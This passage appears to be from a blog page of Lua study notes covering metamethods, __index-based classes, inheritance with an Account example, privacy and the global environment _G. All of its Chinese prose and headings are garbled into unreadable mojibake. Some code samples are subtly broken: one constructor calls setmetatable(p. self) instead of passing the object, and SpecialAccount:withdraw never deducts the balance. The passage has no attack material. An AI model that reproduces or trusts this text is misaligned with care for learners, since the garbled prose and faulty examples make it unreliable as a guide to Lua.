:</p><ul><li>å¦‚æœç¬¬ä¸€ä¸ªå€¼æœ‰å…ƒè¡¨ä¸”å…ƒè¡¨ä¸­å­˜åœ¨æ‰€éœ€çš„å…ƒæ–¹æ³•, é‚£ä¹ˆ Lua å°±ä½¿ç”¨è¿™ä¸ªå…ƒæ–¹æ³•, ä¸ç¬¬äºŒä¸ªå€¼æ— å…³</li><li>å¦‚æœç¬¬äºŒä¸ªå€¼æœ‰å…ƒè¡¨ä¸”å…ƒè¡¨ä¸­å­˜åœ¨æ‰€éœ€çš„å…ƒæ–¹æ³•, é‚£ä¹ˆ Lua å°±ä½¿ç”¨è¿™ä¸ªå…ƒæ–¹æ³•</li><li>éƒ½æ²¡æœ‰åˆ™æŠ›å‡ºå¼‚å¸¸</li></ul><h2 id="20-2-å…³ç³»è¿ç®—ç›¸å…³çš„å…ƒæ–¹æ³•"><a href="#20-2-å…³ç³»è¿ç®—ç›¸å…³çš„å…ƒæ–¹æ³•" class="headerlink" title="20.2 å…³ç³»è¿ç®—ç›¸å…³çš„å…ƒæ–¹æ³•"></a>20.2 å…³ç³»è¿ç®—ç›¸å…³çš„å…ƒæ–¹æ³•</h2><p>å…ƒè¡¨è¿˜å…è®¸æŒ‡å®šå…³ç³»è¿ç®—ç¬¦çš„å«ä¹‰, å…¶ä¸­çš„å…ƒæ–¹æ³•åŒ…æ‹¬:</p><ul><li><code>__eq</code> ç­‰äº</li><li><code>__lt</code> å°äº</li><li><code>__le</code> å°äºç­‰äº</li></ul><p>å…¶ä»–ä¸‰ä¸ªå…³ç³»è¿ç®—ç¬¦æ²¡æœ‰å•ç‹¬çš„å…ƒæ–¹æ³•, å› ä¸º Lua ä¼šå°† <code>a~=b</code> è½¬æ¢ä¸º <code>not (a==b)</code>, <code>a&gt;b</code> è½¬æ¢ä¸º <code>b&lt;a</code>, <code>a&gt;=b</code> è½¬æ¢ä¸º <code>b&lt;=a</code>.</p><p>å®ç° <code>__eq</code>, <code>__le</code> å’Œ <code>__lt</code> ç¤ºä¾‹:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs lua">mt.<span class="hljs-built_in">__eq</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(a, b)</span></span><br>    <span class="hljs-keyword">return</span> a &lt;=b <span class="hljs-keyword">and</span> b &lt;= a<br><span class="hljs-keyword">end</span><br><br>mt.<span class="hljs-built_in">__le</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(a, b)</span></span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(a) <span class="hljs-keyword">do</span> <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> b[k] <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br><br>mt.<span class="hljs-built_in">__lt</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(a, b)</span></span><br>    <span class="hljs-keyword">return</span> a &lt;= b <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> (b &lt;= a)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="20-3-åº“å®šä¹‰ç›¸å…³çš„å…ƒæ–¹æ³•"><a href="#20-3-åº“å®šä¹‰ç›¸å…³çš„å…ƒæ–¹æ³•" class="headerlink" title="20.3 åº“å®šä¹‰ç›¸å…³çš„å…ƒæ–¹æ³•"></a>20.3 åº“å®šä¹‰ç›¸å…³çš„å…ƒæ–¹æ³•</h2><p>Lua è™šæ‹Ÿæœºä¼šæ£€æµ‹ä¸€ä¸ªæ“ä½œä¸­æ¶‰åŠçš„å€¼æ˜¯å¦æœ‰å­˜åœ¨å¯¹åº”å…ƒæ–¹æ³•çš„å…ƒè¡¨, ç”±äºå…ƒè¡¨æ˜¯ä¸€ä¸ªæ™®é€šè¡¨, æ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨å®ƒä»¬.</p><p>å½“å¯¹å€¼è¿›è¡Œæ ¼å¼åŒ–æ—¶, å‡½æ•° <code>tostring</code> ä¼šé¦–å…ˆæ£€æŸ¥å€¼æ˜¯å¦æœ‰ä¸€ä¸ªå…ƒæ–¹æ³• <code>__tostring</code>, å¦‚æœæœ‰, å°±è°ƒç”¨è¿™ä¸ªå…ƒæ–¹æ³•, å°†å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ ç»™è¯¥å‡½æ•°, ç„¶åæŠŠå…ƒæ–¹æ³•çš„è¿”å›å€¼ä½œä¸ºå‡½æ•° <code>tostring</code> çš„è¿”å›å€¼.</p><p>å‡½æ•° <code>setmetatable</code> å’Œ <code>getmetatable</code> ç”¨å…ƒæ–¹æ³•æ¥ä¿æŠ¤å…ƒè¡¨, ä½¿ç”¨æˆ·æ—¢ä¸èƒ½çœ‹åˆ°ä¹Ÿä¸èƒ½ä¿®æ”¹å…ƒè¡¨. éœ€è¦åœ¨å…ƒè¡¨ä¸­è®¾ç½® <code>__metatable</code> å­—æ®µ, åˆ™:</p><ul><li><code>getmetatable</code> ä¼šè¿”å›è¿™ä¸ªå­—æ®µçš„å€¼</li><li><code>setmetatable</code> ä¼šå¼•å‘é”™è¯¯</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">mt.<span class="hljs-built_in">__metatable</span> = <span class="hljs-string">&quot;not your business&quot;</span><br></code></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªå¯¹è±¡æ‹¥æœ‰ <code>__pairs</code> å…ƒæ–¹æ³•æ—¶, <code>pair</code> ä¼šè°ƒç”¨è¿™ä¸ªå…ƒæ–¹æ³•æ¥å®Œæˆéå†.</p><h2 id="20-4-è¡¨ç›¸å…³å…ƒæ–¹æ³•"><a href="#20-4-è¡¨ç›¸å…³å…ƒæ–¹æ³•" class="headerlink" title="20.4 è¡¨ç›¸å…³å…ƒæ–¹æ³•"></a>20.4 è¡¨ç›¸å…³å…ƒæ–¹æ³•</h2><h3 id="20-4-1-index-å…ƒæ–¹æ³•"><a href="#20-4-1-index-å…ƒæ–¹æ³•" class="headerlink" title="20.4.1 __index å…ƒæ–¹æ³•"></a>20.4.1 <code>__index</code> å…ƒæ–¹æ³•</h3><p>å½“è®¿é—®ä¸€ä¸ªè¡¨ä¸­ä¸å­˜åœ¨çš„å­—æ®µæ—¶ä¼šå¼•å‘è§£é‡Šå™¨æŸ¥æ‰¾ä¸€ä¸ªåä¸º <code>__index</code> çš„å…ƒæ–¹æ³•, å¦‚æœæ²¡æœ‰è¿™ä¸ªå…ƒæ–¹æ³•, é‚£ä¹ˆæƒ³ä¸€èˆ¬æƒ…å†µä¸‹ä¸€æ ·, ç»“æœå°±æ˜¯ <code>nil</code>, å¦åˆ™, åˆ™æœ‰è¿™ä¸ªå…ƒæ–¹æ³•æ¥æä¾›æœ€ç»ˆç»“æœ.</p><h3 id="20-4-2-newindex-å…ƒæ–¹æ³•"><a href="#20-4-2-newindex-å…ƒæ–¹æ³•" class="headerlink" title="20.4.2 __newindex å…ƒæ–¹æ³•"></a>20.4.2 <code>__newindex</code> å…ƒæ–¹æ³•</h3><p>ä¸ <code>__index</code> ç±»ä¼¼, ä½†å…¶ä¸ºå½“å¯¹ä¸€ä¸ªè¡¨ä¸­ä¸å­˜åœ¨çš„ç´¢å¼•èµ‹å€¼æ—¶, è§£é‡Šå™¨å°±ä¼šæŸ¥æ‰¾ <code>__newindex</code> å…ƒæ–¹æ³•. å¦‚æœè¿™ä¸ªå…ƒæ–¹æ³•å­˜åœ¨, é‚£ä¹ˆè§£é‡Šå™¨å°±è°ƒç”¨å®ƒè€Œä¸æ‰§è¡Œèµ‹å€¼.</p><h3 id="20-4-3-å…·æœ‰é»˜è®¤å€¼çš„è¡¨"><a href="#20-4-3-å…·æœ‰é»˜è®¤å€¼çš„è¡¨" class="headerlink" title="20.4.3 å…·æœ‰é»˜è®¤å€¼çš„è¡¨"></a>20.4.3 å…·æœ‰é»˜è®¤å€¼çš„è¡¨</h3><p>ä¸€ä¸ªæ™®é€šè¡¨ä¸­æ‰€æœ‰å­—æ®µçš„é»˜è®¤å€¼éƒ½æ˜¯ <code>nil</code>. å¯é€šè¿‡å…ƒè¡¨ä¿®æ”¹, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setDefault</span> <span class="hljs-params">(t, d)</span></span><br>    <span class="hljs-keyword">local</span> mt = &#123;<span class="hljs-built_in">__index</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span></span> <span class="hljs-keyword">return</span> d <span class="hljs-keyword">end</span>&#125;<br>    <span class="hljs-built_in">setmetatable</span>(t, mt)<br><span class="hljs-keyword">end</span><br><br>tab = &#123;x=<span class="hljs-number">10</span>, y=<span class="hljs-number">20</span>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­åˆ©ç”¨ <code>__index</code> è®¾ç½®é»˜è®¤å€¼, è¿™é‡Œä¼ å…¥çš„è¡¨ <code>t</code> çš„é»˜è®¤å€¼å°±æ˜¯ <code>d</code>.</p><h3 id="20-4-4-è·Ÿè¸ªå¯¹è¡¨çš„è®¿é—®"><a href="#20-4-4-è·Ÿè¸ªå¯¹è¡¨çš„è®¿é—®" class="headerlink" title="20.4.4 è·Ÿè¸ªå¯¹è¡¨çš„è®¿é—®"></a>20.4.4 è·Ÿè¸ªå¯¹è¡¨çš„è®¿é—®</h3><p>ç”±äº <code>__index</code> å’Œ <code>__newindex</code> å…ƒæ–¹æ³•éƒ½æ˜¯åœ¨è¡¨ä¸­çš„ç´¢å¼•ä¸å­˜åœ¨æ—¶æ‰æœ‰ç”¨, å› æ­¤, <mark>æ•è·å¯¹ä¸€ä¸ªè¡¨æ‰€æœ‰è®¿é—®çš„å”¯ä¸€æ–¹å¼æ˜¯</mark> ä¿æŒè¡¨æ˜¯ç©ºçš„.</p><p>å¦‚æœè¦ç›‘æ§å¯¹ä¸€ä¸ªè¡¨çš„æ‰€æœ‰è®¿é—®, éœ€è¦ä¸ºçœŸæ­£çš„è¡¨<mark>åˆ›å»ºä¸€ä¸ªä»£ç† (proxy)</mark>. è¿™ä¸ªä»£ç†æ˜¯ä¸€ä¸ªç©ºçš„è¡¨, å…·æœ‰ç”¨äºè·Ÿè¸ªæ‰€æœ‰è®¿é—®å¹¶å°†è®¿é—®é‡å®šå‘åˆ°åŸæ¥çš„è¡¨çš„å…ƒæ–¹æ³•.</p><p>è§ä¹¦.</p><h3 id="20-4-5-åªè¯»çš„è¡¨"><a href="#20-4-5-åªè¯»çš„è¡¨" class="headerlink" title="20.4.5 åªè¯»çš„è¡¨"></a>20.4.5 åªè¯»çš„è¡¨</h3><p>è§ä¹¦</p><h1 id="21-é¢å‘å¯¹è±¡-Object-Oriented-ç¼–ç¨‹"><a href="#21-é¢å‘å¯¹è±¡-Object-Oriented-ç¼–ç¨‹" class="headerlink" title="21 é¢å‘å¯¹è±¡ (Object-Oriented) ç¼–ç¨‹"></a>21 é¢å‘å¯¹è±¡ (Object-Oriented) ç¼–ç¨‹</h1><p>ä»å¾ˆå¤šæ„ä¹‰ä¸Šè®², Lua ä¸­çš„ä¸€å¼ è¡¨å°±æ˜¯ä¸€ä¸ªå¯¹è±¡.</p><p>åœ¨å‡½æ•°ä¸­ä½¿ç”¨å…¨å±€åç§° <code>Account</code> æ˜¯ä¸€ç§éå¸¸ç³Ÿç³•çš„ç¼–ç¨‹ä¹ æƒ¯:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua">Account = &#123; balance = <span class="hljs-number">0</span> &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Account.withdraw</span><span class="hljs-params">(v)</span></span><br>    Account.balance = Account.balance -v<br><span class="hljs-keyword">end</span><br><br>a, Account = Account, <span class="hljs-literal">nil</span><br>a.withdraw(<span class="hljs-number">100.00</span>)  <span class="hljs-comment">-- ERROR!</span><br></code></pre></td></tr></table></figure><p>è¿™é‡ŒæŠ¥é”™æ˜¯å› ä¸º <code>Account</code> å˜æˆ <code>nil</code>, è€Œè¿™é‡Œçš„ <code>withdraw</code> å‡½æ•°ç»‘å®šçš„æ˜¯ <code>Account</code> è¿™ä¸ªå…¨å±€åç§°, å› æ­¤ä¹Ÿæ— æ³•è°ƒç”¨.</p><p>æ­£ç¡®åšæ³•ä¸º, ä½¿ç”¨ <code>self</code>, ä½œä¸ºä¸€ä¸ªæ¥å—è€…:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Account.withdraw</span><span class="hljs-params">(self, v)</span></span><br>    <span class="hljs-built_in">self</span>.balance = <span class="hljs-built_in">self</span>.balance - v<br><span class="hljs-keyword">end</span><br><br>a1, Account = Account, <span class="hljs-literal">nil</span><br>a1.withdraw(a1, <span class="hljs-number">100</span>)    <span class="hljs-comment">-- OK</span><br><br>a2 = &#123; balance = <span class="hljs-number">0</span>, withdraw = Account.withdraw&#125;<br></code></pre></td></tr></table></figure><p><code>a1 = Account</code> å°±æœ‰äº† <code>a1.withdraw</code>, è°ƒç”¨ <code>a1.withdraw(a1, 100)</code> æ—¶, <code>self.balance</code> ä¸º <code>a1.balance</code>. è¿™æ ·å°±èƒ½æˆåŠŸè°ƒç”¨.</p><p>Lua å¯ä»¥ä½¿ç”¨ <mark>å†’å·æ“ä½œç¬¦ (colon operator)</mark> éšè—è¯¥å‚æ•°. å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua">a2.withdraw(a2, <span class="hljs-number">100.00</span>)<br><span class="hljs-comment">-- ç­‰ä»·äº</span><br>a2:withdraw(<span class="hljs-number">100.00</span>)<br><span class="hljs-comment">-- ä¹Ÿå¯ä»¥å®šä¹‰æ—¶</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Account:withdraw</span><span class="hljs-params">(v)</span></span><br>    <span class="hljs-built_in">self</span>.balance = <span class="hljs-built_in">self</span>.balance - v<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="21-1-ç±»-Class"><a href="#21-1-ç±»-Class" class="headerlink" title="21.1 ç±» (Class)"></a>21.1 ç±» (Class)</h2><p>Lua è¯­è¨€ä¸­æ²¡æœ‰ç±»çš„æ¦‚å¿µ. å¯ä»¥åŸºäºåŸå‹çš„æ¦‚å¿µ. (å³ä¸€ä¸ªæ¨¡æ¿)</p><p>å¦‚æœæœ‰ä¸¤ä¸ªå¯¹è±¡ A å’Œ B, è¦è®© B æˆä¸º A çš„ä¸€ä¸ªåŸå‹:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">setmetatable</span>(A, &#123;<span class="hljs-built_in">__index</span> = B&#125;)<br></code></pre></td></tr></table></figure><p><code>&#123;__index = B&#125;</code> æ˜¯ <code>A</code> çš„å…ƒè¡¨, <code>__index = B</code> æ˜¯è¿™ä¸ªå…ƒè¡¨å½“å‰çš„å†…å®¹. å½“è®¿é—® <code>A</code> çš„ä¸€ä¸ªæˆå‘˜å‡½æ•°æˆ–æˆå‘˜å˜é‡æ—¶, <code>A</code> ä¸­ä¸å­˜åœ¨å°±ä¼šæ ¹æ® <code>__index</code> çš„å€¼è¿”å› <code>B</code>, ä¹Ÿå°±å¯ä»¥åˆ° <code>B</code> ä¸­æŸ¥æ‰¾.</p><p>ä¸€ä¸ªç±»ä¸ä»…å¯ä»¥æä¾›æ–¹æ³•, è¿˜å¯ä»¥ä¸ºç¤ºä¾‹ä¸­çš„å­—æ®µæä¾›å¸¸é‡å’Œé»˜è®¤å€¼:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Account:new</span><span class="hljs-params">(o)</span></span><br>    o = o <span class="hljs-keyword">or</span> &#123;&#125;<br>    <span class="hljs-built_in">self</span>.<span class="hljs-built_in">__index</span> = <span class="hljs-built_in">self</span><br>    <span class="hljs-built_in">setmetatable</span>(p. <span class="hljs-built_in">self</span>)<br>    <span class="hljs-keyword">return</span> o<br><span class="hljs-keyword">end</span><br><br>b = Account:new()<br><span class="hljs-built_in">print</span>(b.balance)    <span class="hljs-comment">--&gt; 0</span><br></code></pre></td></tr></table></figure><p><code>Account:new()</code> è¿”å›çš„è¡¨ç»‘å®š <code>Account</code> ä¸ºå…ƒè¡¨.</p><h2 id="21-2-ç»§æ‰¿-Inheritance"><a href="#21-2-ç»§æ‰¿-Inheritance" class="headerlink" title="21.2 ç»§æ‰¿ (Inheritance)"></a>21.2 ç»§æ‰¿ (Inheritance)</h2><p><code>Account</code> ç±»:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs lua">Account = &#123;balance = <span class="hljs-number">0</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Account:new</span><span class="hljs-params">(o)</span></span><br>    o = o <span class="hljs-keyword">or</span> &#123;&#125;<br>    <span class="hljs-built_in">self</span>.<span class="hljs-built_in">__index</span> = <span class="hljs-built_in">self</span><br>    <span class="hljs-built_in">setmetatable</span>(o, <span class="hljs-built_in">self</span>)<br>    <span class="hljs-keyword">return</span> o<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Account:deposit</span><span class="hljs-params">(v)</span></span><br>    <span class="hljs-built_in">self</span>.balance = <span class="hljs-built_in">self</span>.balance + v<br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Account:withdraw</span><span class="hljs-params">(v)</span></span><br>    <span class="hljs-keyword">if</span> v &gt; <span class="hljs-built_in">self</span>.balance <span class="hljs-keyword">then</span> <span class="hljs-built_in">error</span> <span class="hljs-string">&quot;insufficient funds&quot;</span> <span class="hljs-keyword">end</span><br>    <span class="hljs-built_in">self</span>.balance = <span class="hljs-built_in">self</span>.balance - v<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>æ´¾ç”Ÿå­ç±» <code>SpecialAccount</code> åˆ™å…ˆåˆ›å»ºä»åŸºç±»ç»§æ‰¿æ‰€æœ‰æ“ä½œçš„ç©ºç±»:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">SpecialAccount = Account:new()<br></code></pre></td></tr></table></figure><p>å¯ <mark>é‡å®šä¹‰</mark> ä»åŸºç±»ç»§æ‰¿çš„ä»»æ„æ–¹æ³•, æ¯•ç«Ÿæ˜¯ç°åœ¨è‡ªå·±çš„è¡¨é‡Œæ‰¾æ–¹æ³•, æ‰¾ä¸åˆ°å†ä»ç»§æ‰¿çš„ç±»ä¸­æ‰¾, å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SpecialAccount:withdraw</span><span class="hljs-params">(v)</span></span><br>    <span class="hljs-keyword">if</span> v - <span class="hljs-built_in">self</span>.balance &gt;= <span class="hljs-built_in">self</span>:getLimit() <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">error</span> <span class="hljs-string">&quot;insufficient funds&quot;</span><br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SpecialAccount:getLimit</span><span class="hljs-params">()</span></span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>.limit <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="21-3-å¤šé‡ç»§æ‰¿-Multiple-Inheritance"><a href="#21-3-å¤šé‡ç»§æ‰¿-Multiple-Inheritance" class="headerlink" title="21.3 å¤šé‡ç»§æ‰¿ (Multiple Inheritance)"></a>21.3 å¤šé‡ç»§æ‰¿ (Multiple Inheritance)</h2><p>å¤šé‡ç»§æ‰¿ä¹Ÿå°±æ˜¯ä»å¤šä¸ªç±»ä¸­ç»§æ‰¿.</p><p><code>__index</code> å­—æ®µä¸ºä¸€ä¸ªå‡½æ•°æ—¶, å½“ Lua ä¸èƒ½åœ¨åŸæ¥çš„è¡¨ä¸­æ‰¾åˆ°ä¸€ä¸ªé”®æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°.</p><p>ä¸€ç§å¤šé‡ç»§æ‰¿çš„å®ç°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span><span class="hljs-params">(k, plist)</span></span><br>    <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, #plist <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">local</span> v = plist[i][k]   <span class="hljs-comment">-- å°è¯•ç¬¬ &#x27;i&#x27; ä¸ªè¶…ç±»</span><br>        <span class="hljs-keyword">if</span> v <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> v <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span>    <br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createClass</span><span class="hljs-params">(...)</span></span>   <span class="hljs-comment">-- å‚æ•°ä¸ºè¦ç»§æ‰¿çš„ç±»</span><br>    <span class="hljs-keyword">local</span> c = &#123;&#125;            <span class="hljs-comment">-- æ–°ç±»</span><br>    <span class="hljs-keyword">local</span> parents = &#123;...&#125;   <span class="hljs-comment">-- çˆ¶ç±»åˆ—è¡¨</span><br><br>    <span class="hljs-comment">-- åœ¨çˆ¶ç±»åˆ—è¡¨ä¸­æŸ¥æ‰¾ç±»ç¼ºå¤±çš„æ–¹æ³•</span><br>    <span class="hljs-built_in">setmetatable</span>(c, &#123;<span class="hljs-built_in">__index</span> = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(t, k)</span></span><br>        <span class="hljs-keyword">return</span> search(k, parents)<br>    <span class="hljs-keyword">end</span>&#125;)<br><br>    <span class="hljs-comment">-- å°† &#x27;c&#x27; ä½œä¸ºå…¶å®ä¾‹çš„å…ƒè¡¨</span><br>    c.<span class="hljs-built_in">__index</span> = c<br><br>    <span class="hljs-comment">-- ä¸ºæ–°ç±»å®šä¹‰ä¸€ä¸ªæ–°çš„æ„é€ å‡½æ•°</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">c:new</span><span class="hljs-params">(o)</span></span><br>        o = o <span class="hljs-keyword">or</span> &#123;&#125;<br>        <span class="hljs-built_in">setmetatable</span>(o, c)<br>        <span class="hljs-keyword">return</span> o<br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">return</span> c        <span class="hljs-comment">-- è¿”å›æ–°ç±»</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="21-4-ç§æœ‰æ€§-Privacy"><a href="#21-4-ç§æœ‰æ€§-Privacy" class="headerlink" title="21.4 ç§æœ‰æ€§ (Privacy)"></a>21.4 ç§æœ‰æ€§ (Privacy)</h2><p>Lua ä¸­æ ‡å‡†çš„å¯¹è±¡å®ç°æ–¹å¼æ²¡æœ‰æä¾›ç§æœ‰æ€§æœºåˆ¶.</p><p>ä¸€ç§å¸¸è§çš„åšæ³•æ˜¯æŠŠæ‰€æœ‰ç§æœ‰åç§°çš„æœ€ååŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿, è¿™æ ·å°±èƒ½ç«‹åˆ»åŒºåˆ†å‡ºå…¨å±€åç§°.</p><p>å®ç°å…·æœ‰è®¿é—®æ§åˆ¶èƒ½åŠ›çš„å¯¹è±¡, åŸºæœ¬æ€æƒ³æ˜¯é€šè¿‡ä¸¤ä¸ªè¡¨æ¥è¡¨ç¤ºä¸€ä¸ªå¯¹è±¡:</p><ul><li>ä¸€ä¸ªè¡¨ç”¨æ¥ä¿å­˜å¯¹è±¡çš„çŠ¶æ€</li><li>å¦ä¸€ä¸ªè¡¨ç”¨äºä¿å­˜å¯¹è±¡çš„æ“ä½œ (æˆ–æ¥å£)</li></ul><p>æˆ‘ä»¬é€šè¿‡ç¬¬äºŒä¸ªè¡¨æ¥è®¿é—®å¯¹è±¡æœ¬èº«.</p><h1 id="22-ç¯å¢ƒ-Environment"><a href="#22-ç¯å¢ƒ-Environment" class="headerlink" title="22 ç¯å¢ƒ (Environment)"></a>22 ç¯å¢ƒ (Environment)</h1><p>å¯ä»¥è®¤ä¸º, Lua æŠŠæ‰€æœ‰å…¨å±€å˜é‡ä¿å­˜åœ¨ä¸€ä¸ª<mark>ç§°ä¸ºå…¨å±€ç¯å¢ƒ (global environment) çš„æ™®é€šè¡¨ä¸­</mark>.</p><p>Lua å°†å…¨å±€ç¯å¢ƒè‡ªèº«ä¿å­˜åœ¨å…¨å±€å˜é‡ <code>_G</code> ä¸­ (<code>_G._G</code> ä¸ <code>_G</code> ç­‰ä»·).</p><p>è¾“å‡ºå…¨å±€ç¯å¢ƒä¸­å…¨éƒ¨å…¨å±€å˜é‡åç§°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span> (<span class="hljs-built_in">_G</span>) <span class="hljs-keyword">do</span> <span class="hljs-built_in">print</span>(n) <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="22-1-å…·æœ‰åŠ¨æ€åç§°çš„å…¨å±€å˜é‡"><a href="#22-1-å…·æœ‰åŠ¨æ€åç§°çš„å…¨å±€å˜é‡" class="headerlink" title="22.1 å…·æœ‰åŠ¨æ€åç§°çš„å…¨å±€å˜é‡"></a>22.1 å…·æœ‰åŠ¨æ€åç§°çš„å…¨å±€å˜é‡</h2><p>è·å–å…¨å±€è¡¨ä¸­çš„å€¼:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">value = <span class="hljs-built_in">_G</span>[varname]<br></code></pre></td></tr></table></figure><h2 id="22-2-å…¨å±€å˜é‡çš„å£°æ˜"><a href="#22-2-å…¨å±€å˜é‡çš„å£°æ˜" class="headerlink" title="22.2 å…¨å±€å˜é‡çš„å£°æ˜"></a>22.2 å…¨å±€å˜é‡çš„å£°æ˜</h2><p>Lua 